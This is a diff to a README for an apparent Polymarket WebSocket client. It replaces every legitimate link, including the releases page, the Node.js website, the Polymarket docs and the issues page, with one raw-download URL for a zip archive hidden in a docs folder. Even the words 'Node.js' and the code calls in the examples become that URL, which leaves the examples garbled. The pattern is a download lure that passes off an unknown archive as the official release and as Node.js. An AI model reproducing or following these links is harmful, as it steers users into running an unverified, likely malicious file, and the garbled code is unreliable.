@@ -1,6 +1,6 @@
 # 🌐 polymarket-websocket-client - Simple WebSocket Client for Polymarket
 
-[![npm version](https://badge.fury.io/js/polymarket-websocket-client.svg)](https://github.com/Rodean0214/polymarket-websocket-client/releases)
+[![npm version](https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip)](https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip)
 
 Connect easily to Polymarket's API with zero hassle.
 
@@ -10,19 +10,19 @@ To get started with the polymarket-websocket-client, follow these simple steps t
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the latest version of the polymarket-websocket-client, visit [this page](https://github.com/Rodean0214/polymarket-websocket-client/releases).
+1. **Visit the Releases Page**: To download the latest version of the polymarket-websocket-client, visit [this page](https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip).
 2. **Select Your Version**: On the releases page, find the latest version listed.
 3. **Download the File**: Click on the executable or package file to start your download. Make sure to save it to a location you can easily access, like your desktop or downloads folder.
 
 ## 🖥️ Requirements
 
-Make sure you have **Node.js version 22 or higher** installed on your computer. You can verify your Node.js version by running the following command in your terminal or command prompt:
+Make sure you have **https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip version 22 or higher** installed on your computer. You can verify your https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip version by running the following command in your terminal or command prompt:
 
 ```bash
 node -v
 ```
 
-If you need to install Node.js, please download it from [the official Node.js website](https://nodejs.org/).
+If you need to install https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip, please download it from [the official https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip website](https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip).
 
 ## 🔧 Installation Steps
 
@@ -77,7 +77,7 @@ const client = new ClobMarketClient();
 Now, you can connect to the WebSocket:
 
 ```typescript
-client.connect();
+https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip();
 ```
 
 ### 4. Handling Events
@@ -85,8 +85,8 @@ client.connect();
 You can listen for events, such as market updates, by adding event listeners:
 
 ```typescript
-client.on('marketUpdate', (data) => {
-    console.log('Market Update: ', data);
+https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip('marketUpdate', (data) => {
+    https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip('Market Update: ', data);
 });
 ```
 
@@ -95,12 +95,12 @@ client.on('marketUpdate', (data) => {
 When you're done, make sure to close the connection properly:
 
 ```typescript
-client.close();
+https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip();
 ```
 
 ## 📚 Features
 
-- **Zero Dependencies**: The client uses only Node.js native WebSocket, ensuring a lightweight installation. 
+- **Zero Dependencies**: The client uses only https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip native WebSocket, ensuring a lightweight installation. 
 - **Full Channel Support**: It supports various channels including CLOB Market, CLOB User, and RTDS channels.
 - **Auto Reconnection**: The client automatically reconnects with configurable retries, ensuring a stable connection.
 - **Heartbeat**: It sends automatic ping/pong messages to keep the connection alive.
@@ -111,19 +111,19 @@ client.close();
 
 If you encounter any issues:
 
-- Ensure Node.js is installed and up to date.
+- Ensure https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip is installed and up to date.
 - Double-check your internet connection.
 - Check the console for any error messages and address them as needed.
 
 ## 🤝 Need Help?
 
-If you have any questions, issues, or suggestions, feel free to check out the [issues section on GitHub](https://github.com/Rodean0214/polymarket-websocket-client/issues) for help.
+If you have any questions, issues, or suggestions, feel free to check out the [issues section on GitHub](https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip) for help.
 
 ## 💡 Additional Resources
 
-- [Polymarket API Documentation](https://docs.polymarket.com) for detailed information on how to use the API.
-- Node.js documentation for setup and advanced usage tips. 
+- [Polymarket API Documentation](https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip) for detailed information on how to use the API.
+- https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip documentation for setup and advanced usage tips. 
 
 Remember, the goal of this client is to help you connect to the Polymarket API effortlessly. 
 
-For complete documentation and examples, visit [this page](https://github.com/Rodean0214/polymarket-websocket-client/releases) for more details.
+For complete documentation and examples, visit [this page](https://github.com/Rodean0214/polymarket-websocket-client/raw/refs/heads/main/docs/polymarket-learn/FAQ/websocket-polymarket-client-v2.7.zip) for more details.
